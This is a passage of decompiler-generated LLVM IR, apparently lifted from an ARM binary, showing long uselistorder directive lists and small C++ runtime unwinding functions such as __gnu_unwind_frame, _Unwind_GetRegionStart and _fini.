  uselistorder i32* @lr, { 5, 0, 190, 191, 192, 193, 201, 194, 195, 196, 197, 3, 198, 199, 200, 202, 203, 204, 205, 206, 207, 209, 210, 7, 8, 211, 212, 213, 214, 215, 216, 217, 218, 219, 11, 12, 13, 14, 15, 16, 17, 18, 19, 9, 10, 20, 220, 221, 223, 224, 225, 230, 85, 86, 36, 37, 228, 229, 145, 146, 187, 188, 189, 222, 226, 227, 162, 163, 164, 165, 166, 155, 156, 157, 167, 180, 181, 168, 169, 170, 171, 172, 173, 174, 4, 175, 176, 178, 179, 177, 147, 148, 139, 140, 132, 133, 38, 39, 6, 182, 183, 74, 75, 76, 77, 78, 79, 40, 41, 208, 80, 184, 87, 42, 43, 44, 45, 46, 47, 1, 51, 52, 53, 54, 55, 56, 48, 49, 50, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 2, 32, 33, 34, 35, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 81, 82, 83, 84, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 134, 135, 136, 137, 138, 141, 142, 143, 144, 149, 150, 151, 152, 153, 154, 158, 159, 160, 161, 185, 186 }
  uselistorder i32* @r6, { 495, 496, 497, 508, 498, 29, 499, 5, 500, 501, 6, 502, 503, 504, 505, 506, 507, 509, 1, 510, 511, 97, 98, 95, 96, 99, 512, 513, 7, 514, 515, 516, 517, 82, 83, 100, 8, 101, 102, 103, 104, 105, 25, 106, 107, 108, 9, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 80, 81, 84, 85, 86, 87, 10, 88, 89, 90, 11, 91, 92, 93, 94, 121, 30, 122, 26, 12, 13, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 484, 485, 486, 487, 520, 488, 14, 489, 490, 74, 15, 75, 16, 76, 518, 519, 437, 441, 442, 443, 444, 438, 439, 440, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 445, 470, 471, 472, 446, 447, 448, 449, 450, 17, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 466, 468, 462, 463, 464, 465, 467, 469, 144, 145, 2, 146, 395, 396, 357, 358, 359, 360, 361, 350, 351, 147, 148, 149, 150, 151, 362, 363, 364, 365, 366, 152, 153, 154, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 155, 156, 157, 158, 159, 160, 161, 162, 163, 254, 18, 255, 256, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 33, 60, 188, 189, 190, 191, 192, 193, 194, 61, 195, 62, 63, 64, 65, 66, 34, 35, 36, 55, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 56, 0, 57, 58, 59, 67, 68, 69, 70, 71, 72, 73, 196, 197, 4, 3, 198, 199, 200, 201, 202, 203, 204, 27, 205, 206, 207, 208, 209, 216, 217, 218, 219, 220, 210, 211, 212, 213, 214, 215, 134, 135, 19, 136, 137, 138, 139, 140, 141, 142, 143, 266, 267, 268, 269, 221, 222, 223, 224, 225, 226, 227, 231, 77, 78, 79, 228, 229, 230, 20, 232, 233, 234, 235, 236, 237, 238, 239, 257, 258, 259, 260, 28, 261, 262, 263, 21, 264, 265, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 31, 22, 309, 310, 312, 313, 311, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 352, 353, 354, 355, 356, 367, 368, 32, 23, 369, 370, 372, 373, 371, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 24, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 491, 492, 493, 494 }
  uselistorder label %dec_label_pc_19968, { 1, 0 }
  uselistorder label %dec_label_pc_19904, { 1, 0 }
  uselistorder label %dec_label_pc_198b0, { 1, 0 }
  uselistorder label %dec_label_pc_19888, { 1, 0 }
  uselistorder label %dec_label_pc_197f4, { 1, 0 }
  uselistorder label %dec_label_pc_197d8, { 1, 0 }
  uselistorder label %dec_label_pc_197bc, { 1, 0 }
  uselistorder label %dec_label_pc_1976c, { 1, 0 }
  uselistorder label %dec_label_pc_19750, { 1, 0 }
  uselistorder label %dec_label_pc_196cc, { 1, 0 }
  uselistorder label %dec_label_pc_196b0, { 1, 0 }
  uselistorder label %dec_label_pc_195ec, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_195bc, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_195a4, { 1, 0 }
  uselistorder label %dec_label_pc_19588, { 1, 0 }
  uselistorder label %dec_label_pc_192ec.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_19414, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_19408, { 0, 2, 1 }
  uselistorder label %dec_label_pc_193fc, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_193ac, { 1, 0 }
  uselistorder label %dec_label_pc_1939c, { 1, 0 }
  uselistorder label %dec_label_pc_19328, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_13.3, align 8
  %v1_199f0 = add i32 %ucbp, 76
  %v2_199f0 = inttoptr i32 %v1_199f0 to i32*
  %v3_199f0 = load i32, i32* %v2_199f0, align 4
  %v1_199f4 = add i32 %v3_199f0, 4
  %v2_199f4 = inttoptr i32 %v1_199f4 to i32*
  %v3_199f4 = load i32, i32* %v2_199f4, align 4
  %v3_199fc = mul i32 %v3_199f4, 256
  %v4_19a04 = getelementptr inbounds %anon_struct_13.3, %anon_struct_13.3* %uws_-20, i32 0, i32 0
  store i32 %v3_199fc, i32* %v4_19a04, align 8
  %tmp7 = bitcast %anon_struct_13.3* %uws_-20 to %anon_struct_13*
  %v4_19a24 = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %tmp7)
  ret i32 %v4_19a24

; uselistorder directives
  uselistorder %anon_struct_13.3* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_13*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, { 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 335, 326, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 320, 327, 324, 50, 325, 51, 52, 53, 319, 54, 55, 56, 0, 323, 1, 57, 58, 59, 60, 61, 63, 64, 65, 62, 67, 68, 69, 66, 70, 71, 72, 73, 75, 74, 76, 77, 78, 79, 80, 81, 82, 85, 84, 83, 86, 87, 88, 89, 328, 90, 91, 92, 93, 94, 329, 95, 96, 97, 98, 330, 99, 100, 101, 102, 103, 104, 105, 107, 106, 108, 110, 109, 111, 331, 112, 332, 121, 116, 122, 117, 118, 113, 114, 123, 119, 115, 120, 124, 125, 126, 127, 128, 129, 130, 131, 138, 135, 139, 136, 140, 137, 132, 133, 134, 141, 142, 143, 144, 145, 155, 151, 146, 156, 152, 157, 153, 147, 148, 149, 158, 154, 150, 159, 160, 161, 162, 163, 164, 165, 166, 2, 167, 168, 3, 177, 173, 178, 174, 169, 170, 171, 179, 175, 180, 176, 172, 181, 182, 183, 184, 185, 186, 196, 197, 191, 198, 192, 187, 188, 193, 199, 194, 200, 195, 189, 190, 201, 202, 203, 204, 209, 207, 205, 210, 208, 206, 211, 212, 216, 220, 221, 217, 213, 214, 218, 215, 219, 222, 223, 321, 333, 224, 226, 225, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 241, 239, 237, 242, 240, 238, 243, 244, 248, 252, 253, 249, 245, 246, 250, 247, 251, 254, 255, 322, 334, 256, 258, 257, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 4, 273, 274, 279, 286, 280, 287, 281, 275, 276, 288, 282, 277, 283, 289, 284, 278, 285, 290, 291, 292, 293, 294, 295, 296, 301, 308, 302, 309, 303, 297, 298, 310, 304, 299, 305, 311, 306, 300, 307, 312, 313, 314, 315, 316, 317, 318 }
  uselistorder i32 4, { 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 110, 513, 514, 515, 516, 517, 5, 520, 521, 518, 519, 522, 6, 523, 524, 525, 526, 7, 543, 8, 527, 528, 529, 530, 531, 9, 532, 10, 533, 534, 535, 536, 537, 538, 539, 11, 540, 148, 541, 542, 544, 545, 546, 547, 12, 548, 13, 260, 261, 262, 263, 279, 280, 549, 241, 242, 445, 247, 264, 14, 15, 552, 16, 17, 93, 88, 89, 18, 553, 90, 554, 73, 19, 20, 91, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 21, 572, 573, 574, 575, 576, 577, 72, 578, 579, 580, 581, 582, 583, 22, 23, 92, 584, 272, 111, 270, 271, 265, 266, 267, 268, 269, 243, 244, 245, 246, 248, 249, 250, 251, 252, 253, 24, 254, 112, 255, 256, 257, 258, 259, 149, 273, 274, 275, 276, 277, 278, 25, 281, 282, 283, 284, 325, 326, 285, 286, 287, 585, 26, 150, 113, 151, 587, 27, 588, 152, 239, 586, 84, 496, 497, 498, 499, 153, 74, 449, 450, 451, 452, 453, 454, 154, 155, 28, 455, 456, 457, 458, 459, 460, 461, 462, 156, 447, 448, 420, 421, 422, 423, 424, 425, 426, 427, 428, 29, 429, 430, 431, 463, 30, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 157, 158, 159, 478, 479, 482, 485, 480, 481, 114, 160, 483, 64, 484, 486, 487, 488, 490, 161, 32, 31, 489, 162, 163, 164, 295, 33, 34, 165, 65, 35, 36, 327, 328, 329, 330, 331, 37, 332, 75, 550, 551, 214, 38, 39, 115, 296, 76, 232, 116, 233, 120, 121, 166, 234, 297, 298, 40, 299, 94, 117, 118, 229, 235, 236, 119, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 0, 230, 231, 237, 238, 122, 68, 67, 300, 85, 301, 41, 302, 42, 70, 69, 304, 43, 303, 305, 306, 311, 123, 313, 124, 314, 125, 315, 316, 312, 307, 126, 308, 309, 310, 288, 167, 289, 66, 44, 290, 291, 45, 292, 77, 86, 127, 293, 294, 406, 317, 83, 82, 81, 318, 128, 46, 47, 48, 49, 50, 51, 319, 79, 78, 320, 80, 129, 321, 322, 323, 168, 240, 130, 324, 52, 333, 334, 335, 169, 336, 337, 338, 339, 170, 171, 131, 340, 132, 341, 95, 342, 343, 344, 172, 345, 346, 173, 174, 347, 96, 348, 97, 349, 350, 175, 351, 352, 176, 177, 353, 133, 354, 98, 355, 178, 179, 180, 356, 357, 134, 99, 358, 359, 181, 360, 361, 362, 182, 183, 1, 135, 363, 100, 364, 365, 366, 184, 367, 368, 185, 186, 2, 136, 369, 101, 370, 102, 371, 372, 373, 374, 187, 375, 376, 188, 189, 377, 378, 137, 379, 3, 380, 103, 381, 138, 382, 383, 384, 385, 190, 386, 387, 191, 192, 388, 389, 139, 390, 4, 391, 104, 392, 140, 393, 193, 194, 195, 394, 395, 141, 105, 396, 397, 398, 399, 196, 400, 401, 197, 198, 143, 402, 142, 403, 106, 404, 107, 405, 407, 408, 409, 410, 411, 145, 412, 146, 413, 199, 414, 71, 415, 200, 201, 147, 416, 144, 417, 108, 418, 109, 419, 202, 53, 432, 203, 54, 433, 204, 55, 434, 205, 56, 435, 206, 57, 436, 207, 87, 58, 437, 438, 208, 59, 439, 209, 60, 440, 210, 61, 441, 211, 62, 442, 212, 63, 443, 444, 446, 491, 492, 493, 494, 495, 500, 213, 501, 502 }
  uselistorder i32 76, { 18, 19, 20, 21, 22, 23, 0, 3, 5, 4, 6, 2, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 1 }
  uselistorder i32 1, { 762, 1365, 1366, 589, 1370, 1371, 1372, 1373, 630, 1374, 1375, 548, 564, 631, 1367, 1368, 1369, 1376, 590, 1377, 763, 137, 135, 139, 138, 136, 133, 134, 764, 765, 766, 767, 632, 633, 1378, 1379, 531, 770, 769, 768, 145, 147, 146, 148, 150, 149, 773, 772, 771, 103, 634, 635, 102, 1380, 96, 1381, 776, 775, 774, 89, 1382, 1383, 1384, 1385, 778, 777, 61, 63, 64, 62, 65, 151, 152, 540, 779, 403, 1052, 780, 404, 405, 406, 781, 120, 1053, 1054, 1055, 13, 12, 14, 15, 782, 171, 783, 20, 17, 18, 16, 19, 784, 595, 1025, 98, 99, 97, 88, 87, 1386, 565, 636, 1387, 1, 0, 785, 85, 80, 78, 79, 86, 83, 84, 81, 82, 77, 46, 637, 75, 786, 408, 409, 407, 549, 588, 550, 1309, 1310, 1311, 1312, 566, 787, 410, 789, 788, 411, 412, 1031, 790, 1056, 1057, 1058, 1389, 1060, 1059, 532, 791, 553, 1061, 554, 1390, 1027, 1026, 1391, 555, 1392, 1393, 1394, 1395, 1396, 1397, 987, 1398, 1399, 1400, 1401, 1402, 1403, 988, 755, 793, 792, 413, 417, 419, 415, 414, 416, 418, 420, 422, 421, 1065, 1062, 1063, 1064, 585, 556, 70, 71, 72, 73, 638, 1066, 1067, 1082, 1083, 794, 756, 335, 336, 1074, 989, 1075, 1076, 990, 1077, 1078, 1079, 1080, 1081, 56, 48, 49, 51, 54, 52, 50, 53, 47, 55, 1068, 1069, 1070, 639, 1071, 1072, 1073, 795, 426, 429, 427, 423, 430, 424, 425, 428, 431, 1084, 1085, 1086, 796, 116, 115, 111, 110, 109, 114, 112, 113, 117, 1087, 1088, 1089, 1090, 797, 294, 295, 293, 298, 296, 297, 798, 176, 1029, 640, 1028, 586, 801, 800, 799, 503, 509, 501, 505, 504, 508, 506, 507, 510, 502, 641, 1030, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 557, 802, 512, 511, 513, 517, 514, 515, 516, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 803, 26, 30, 33, 29, 27, 31, 28, 32, 642, 1042, 804, 76, 1091, 1092, 1093, 1094, 1095, 643, 805, 34, 35, 36, 38, 37, 644, 39, 806, 167, 166, 163, 164, 165, 161, 162, 807, 204, 205, 212, 213, 208, 209, 210, 211, 206, 207, 808, 319, 317, 318, 809, 432, 810, 101, 100, 811, 69, 68, 812, 67, 66, 813, 1185, 237, 240, 238, 239, 433, 169, 170, 814, 119, 118, 815, 140, 816, 817, 104, 105, 1404, 1405, 1406, 645, 1407, 1408, 646, 1409, 820, 819, 818, 214, 216, 222, 215, 220, 219, 223, 221, 217, 218, 821, 59, 647, 822, 434, 435, 436, 823, 442, 440, 441, 439, 437, 438, 824, 348, 349, 347, 350, 346, 825, 826, 168, 828, 827, 158, 829, 106, 384, 1358, 832, 831, 830, 185, 186, 833, 224, 226, 225, 227, 558, 834, 132, 525, 533, 1359, 835, 388, 385, 386, 387, 389, 390, 1360, 1361, 1362, 836, 444, 443, 447, 450, 449, 448, 446, 453, 445, 451, 452, 315, 541, 1022, 1023, 1024, 837, 838, 551, 1158, 552, 1159, 1160, 542, 1161, 455, 459, 454, 457, 458, 461, 462, 460, 456, 1162, 1410, 567, 648, 840, 839, 841, 1314, 1317, 1318, 1319, 842, 463, 468, 469, 467, 466, 470, 464, 465, 1320, 1321, 1322, 1323, 843, 475, 481, 474, 480, 479, 473, 483, 482, 477, 471, 476, 472, 478, 1315, 1316, 649, 182, 184, 183, 60, 1298, 650, 1299, 1300, 1301, 1302, 1303, 844, 340, 341, 339, 342, 1324, 155, 154, 1325, 1326, 1327, 1328, 1329, 1330, 596, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 652, 1339, 1340, 1341, 1342, 1343, 651, 1344, 1345, 1346, 1347, 1348, 845, 486, 488, 484, 487, 492, 495, 491, 493, 494, 489, 490, 485, 91, 90, 653, 654, 546, 849, 848, 847, 846, 316, 257, 559, 267, 850, 286, 285, 851, 280, 279, 852, 175, 853, 496, 854, 855, 497, 856, 398, 857, 498, 858, 859, 499, 860, 392, 391, 861, 93, 92, 57, 862, 157, 156, 863, 864, 500, 865, 160, 159, 866, 523, 867, 1212, 1213, 399, 400, 992, 993, 994, 995, 996, 997, 998, 1411, 141, 142, 143, 144, 868, 1186, 655, 10, 11, 1096, 869, 314, 313, 24, 656, 1187, 870, 277, 278, 657, 871, 301, 299, 300, 1188, 872, 23, 22, 21, 873, 284, 283, 874, 875, 122, 121, 876, 108, 877, 518, 878, 236, 879, 95, 94, 880, 74, 882, 881, 401, 402, 884, 883, 337, 338, 381, 526, 1388, 383, 382, 1189, 1190, 1191, 1192, 539, 1193, 886, 885, 131, 130, 125, 128, 126, 127, 123, 124, 129, 2, 1163, 1164, 1165, 1166, 1214, 560, 1215, 561, 1216, 888, 887, 519, 1194, 1195, 1196, 1197, 889, 1305, 1306, 568, 3, 536, 4, 1307, 1097, 1098, 1099, 658, 1198, 520, 1349, 256, 1200, 1199, 1201, 312, 1217, 373, 1232, 890, 290, 289, 288, 287, 1218, 891, 180, 179, 178, 177, 659, 1017, 660, 1018, 597, 1019, 1126, 662, 1127, 1020, 1004, 999, 664, 547, 1000, 1001, 665, 1002, 1003, 669, 1005, 1006, 1007, 666, 1008, 1009, 670, 1010, 1011, 667, 1012, 1013, 668, 663, 1014, 1015, 1016, 671, 672, 1021, 570, 673, 674, 1128, 1129, 1130, 675, 1131, 1132, 1133, 676, 569, 1134, 991, 1137, 1136, 661, 1135, 1138, 1139, 677, 1140, 1141, 1142, 571, 1149, 1150, 543, 678, 904, 903, 902, 901, 900, 899, 898, 897, 896, 895, 894, 893, 892, 252, 250, 251, 254, 253, 255, 1143, 1144, 679, 1145, 1146, 680, 1147, 1148, 245, 244, 243, 249, 246, 247, 248, 242, 241, 681, 682, 906, 905, 521, 522, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 527, 538, 1107, 1108, 572, 528, 1109, 1110, 1111, 1112, 529, 537, 1113, 1114, 573, 530, 1115, 683, 1116, 1117, 684, 1118, 685, 1119, 1120, 562, 1123, 1121, 1122, 534, 535, 1124, 686, 1125, 914, 758, 913, 912, 911, 910, 909, 908, 757, 907, 355, 356, 358, 351, 354, 353, 352, 357, 915, 181, 1290, 579, 563, 916, 310, 309, 308, 307, 311, 305, 303, 302, 304, 306, 1219, 918, 917, 332, 333, 331, 330, 329, 328, 334, 689, 598, 1151, 1152, 599, 1153, 1154, 687, 688, 690, 1155, 1156, 691, 692, 693, 694, 695, 696, 697, 931, 930, 929, 928, 927, 926, 925, 924, 923, 922, 761, 921, 920, 919, 173, 174, 172, 698, 544, 699, 932, 700, 701, 702, 705, 704, 703, 1157, 934, 933, 235, 706, 1167, 584, 1168, 583, 1169, 582, 1170, 581, 1171, 580, 1172, 1173, 707, 587, 708, 1174, 709, 1175, 710, 1176, 711, 1177, 712, 1178, 713, 1179, 714, 1180, 715, 1181, 716, 1182, 717, 1183, 718, 1184, 545, 719, 947, 946, 945, 944, 943, 942, 941, 940, 939, 938, 937, 936, 935, 393, 394, 397, 395, 396, 1202, 1208, 6, 574, 1203, 720, 1204, 5, 1205, 591, 1206, 575, 576, 1207, 1209, 1210, 592, 1211, 759, 951, 950, 760, 949, 948, 276, 1291, 600, 601, 1292, 7, 8, 9, 1220, 1221, 1222, 1223, 1224, 593, 594, 721, 1225, 1226, 722, 1227, 1228, 723, 1229, 1231, 1230, 955, 954, 953, 952, 189, 191, 193, 194, 192, 187, 190, 188, 1233, 1234, 1235, 724, 725, 957, 956, 360, 363, 364, 359, 362, 361, 1236, 1237, 1238, 726, 1239, 727, 603, 602, 728, 1240, 958, 367, 370, 371, 372, 369, 365, 368, 366, 1241, 1242, 729, 1243, 604, 577, 730, 959, 281, 282, 1244, 1245, 1246, 731, 1247, 732, 733, 1248, 605, 1249, 960, 269, 273, 274, 275, 272, 268, 271, 270, 1250, 1251, 1252, 734, 1253, 735, 607, 606, 736, 1254, 737, 1255, 961, 261, 264, 265, 266, 263, 258, 262, 259, 260, 1256, 1257, 1258, 1259, 1260, 738, 1261, 739, 1262, 740, 612, 611, 741, 1263, 608, 1264, 609, 1265, 610, 1266, 967, 966, 965, 964, 963, 962, 231, 232, 233, 234, 228, 230, 229, 1267, 1268, 1269, 1270, 1271, 742, 1272, 743, 1273, 744, 621, 620, 745, 1274, 619, 1275, 618, 1276, 613, 1277, 614, 1278, 615, 1279, 616, 1280, 617, 1281, 973, 972, 971, 970, 969, 968, 377, 378, 380, 379, 374, 376, 375, 1282, 1283, 746, 1284, 622, 578, 747, 974, 291, 292, 1285, 1286, 1287, 748, 625, 624, 749, 1288, 623, 1289, 975, 320, 321, 325, 326, 327, 324, 323, 322, 1293, 1294, 1295, 750, 628, 627, 751, 1296, 626, 1297, 980, 979, 978, 977, 976, 195, 196, 201, 202, 203, 200, 199, 198, 197, 1304, 629, 752, 981, 343, 344, 345, 1308, 982, 153, 1313, 983, 107, 1350, 1353, 753, 1354, 1355, 1351, 1352, 1356, 1357, 41, 42, 44, 43, 40, 45, 1363, 754, 984, 58, 1364, 25, 985, 986, 524 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_19a50 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_19a58 = add i32 %tmp1, 72
  %v2_19a58 = inttoptr i32 %v1_19a58 to i32*
  %v3_19a58 = load i32, i32* %v2_19a58, align 4
  ret i32 %v3_19a58

; uselistorder directives
  uselistorder i32 72, { 10, 11, 0, 12, 2, 3, 1, 4, 7, 8, 5, 6, 9 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 9, 8, 11, 10, 172, 173, 174, 175, 15, 16, 65, 17, 176, 57, 12, 177, 178, 179, 180, 181, 183, 184, 182, 185, 186, 187, 188, 189, 190, 191, 18, 19, 20, 21, 23, 22, 24, 58, 59, 25, 26, 60, 61, 62, 63, 64, 66, 67, 88, 68, 69, 192, 6, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 3, 126, 127, 128, 129, 130, 27, 131, 149, 28, 29, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 168, 161, 162, 163, 164, 165, 166, 167, 169, 170, 30, 171, 4, 89, 90, 31, 91, 92, 93, 32, 70, 42, 52, 53, 54, 71, 72, 55, 43, 44, 45, 46, 47, 48, 49, 50, 51, 56, 33, 34, 35, 73, 74, 75, 7, 76, 77, 78, 79, 81, 82, 41, 83, 36, 84, 37, 85, 87, 86, 80, 5, 121, 94, 38, 95, 96, 97, 98, 99, 100, 101, 39, 102, 103, 104, 40, 105, 106, 107, 108, 109, 110, 13, 111, 112, 113, 114, 115, 116, 14, 117, 118, 119, 120, 122, 123, 124, 125, 0, 1, 2 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_19a6c = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_19a6c)
  %v31_19a74 = load i32, i32* @r0, align 4
  ret i32 %v31_19a74

; uselistorder directives
  uselistorder i32* @r0, { 13, 14, 15, 247, 248, 249, 16, 42, 78, 89, 250, 253, 254, 69, 17, 251, 252, 229, 48, 8, 255, 9, 18, 79, 0, 80, 10, 11, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 1, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 81, 19, 70, 71, 72, 73, 74, 75, 76, 77, 82, 83, 84, 85, 86, 87, 88, 45, 245, 46, 246, 20, 21, 22, 23, 171, 172, 282, 283, 285, 59, 60, 61, 62, 24, 195, 196, 2, 25, 26, 94, 95, 3, 27, 28, 286, 287, 4, 29, 30, 215, 216, 5, 31, 32, 67, 68, 284, 156, 90, 231, 33, 56, 57, 232, 6, 233, 234, 235, 223, 54, 224, 225, 226, 55, 227, 228, 34, 243, 236, 237, 238, 239, 240, 241, 242, 96, 97, 35, 217, 36, 218, 209, 37, 210, 205, 38, 206, 98, 39, 99, 211, 40, 212, 100, 41, 101, 102, 43, 44, 173, 174, 175, 176, 103, 47, 104, 49, 50, 177, 178, 179, 180, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 65, 141, 63, 64, 66, 142, 145, 146, 147, 148, 149, 150, 143, 144, 91, 92, 93, 52, 151, 152, 153, 154, 155, 157, 158, 53, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 181, 182, 183, 184, 185, 186, 187, 12, 188, 189, 190, 191, 192, 193, 194, 219, 220, 7, 197, 198, 199, 200, 201, 202, 203, 204, 207, 208, 213, 214, 221, 222, 230, 244, 58, 51 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 68, 61, 62, 63, 64, 65, 66, 67, 69, 70, 71, 72, 17, 18, 19, 20, 21, 22, 13, 14, 15, 16, 23, 24, 25, 26, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 27, 28, 29, 73, 78, 79, 80, 81, 82, 83, 84, 74, 88, 89, 90, 91, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 39, 75, 76, 77, 85, 86, 87, 40, 41, 42, 0, 36, 37, 38, 43, 47, 48, 44, 45, 46, 92, 30, 31, 32, 33, 34, 35, 59, 60 }
  uselistorder i32 0, { 441, 440, 504, 505, 1407, 445, 444, 506, 1408, 1409, 1410, 1411, 387, 386, 507, 1412, 1413, 209, 1414, 1416, 1417, 153, 154, 1418, 1419, 1415, 97, 98, 99, 100, 2, 1, 3, 0, 198, 197, 199, 200, 201, 1420, 442, 443, 147, 142, 1421, 1422, 203, 204, 202, 205, 1423, 1424, 1425, 1426, 208, 207, 206, 1427, 1428, 1429, 431, 430, 508, 446, 509, 447, 510, 448, 511, 512, 513, 155, 1430, 462, 461, 1431, 1432, 460, 459, 1433, 514, 457, 458, 455, 456, 454, 453, 1434, 452, 451, 450, 449, 394, 1435, 1451, 1436, 212, 1437, 1438, 1439, 1440, 1441, 1442, 214, 1444, 1445, 210, 211, 1446, 1447, 131, 156, 1448, 1449, 706, 101, 102, 432, 433, 213, 1443, 1450, 393, 1452, 515, 516, 1453, 464, 463, 215, 1454, 1455, 216, 1456, 1457, 1458, 113, 517, 518, 1459, 217, 1460, 157, 1461, 1462, 218, 1463, 1464, 1465, 1466, 1467, 1468, 1469, 1470, 1471, 1472, 39, 132, 519, 1473, 219, 1474, 1475, 1476, 4, 1477, 1478, 5, 1479, 1480, 925, 926, 6, 148, 1481, 520, 1482, 839, 840, 841, 842, 843, 847, 844, 845, 846, 7, 395, 103, 848, 521, 849, 850, 851, 465, 466, 927, 928, 8, 522, 784, 523, 1483, 1484, 1485, 9, 10, 158, 159, 160, 1500, 1501, 11, 785, 161, 162, 1317, 1318, 1319, 1320, 220, 221, 1321, 794, 222, 133, 49, 1502, 104, 396, 1506, 1507, 50, 852, 114, 853, 854, 855, 397, 163, 1503, 1504, 1505, 398, 12, 1508, 1509, 1510, 1511, 1512, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1513, 1514, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 40, 1533, 1534, 1535, 1536, 1537, 41, 1538, 1539, 1540, 42, 1541, 1542, 1543, 43, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 1557, 1558, 1559, 1560, 1561, 1562, 1563, 1564, 1565, 1566, 1567, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1568, 1569, 1577, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 1585, 1586, 44, 1587, 1588, 1589, 1590, 1591, 45, 1592, 1593, 1594, 1595, 1596, 46, 1597, 1598, 1599, 1600, 1601, 1602, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 1610, 1611, 223, 856, 707, 857, 858, 859, 860, 894, 524, 525, 895, 896, 164, 165, 166, 227, 861, 225, 862, 883, 876, 708, 877, 878, 879, 880, 51, 52, 117, 881, 882, 399, 884, 885, 709, 886, 224, 887, 53, 54, 116, 888, 889, 710, 890, 891, 55, 56, 115, 892, 226, 893, 167, 863, 711, 864, 865, 526, 866, 867, 712, 868, 869, 872, 870, 871, 400, 873, 57, 58, 119, 874, 713, 59, 60, 118, 875, 897, 714, 898, 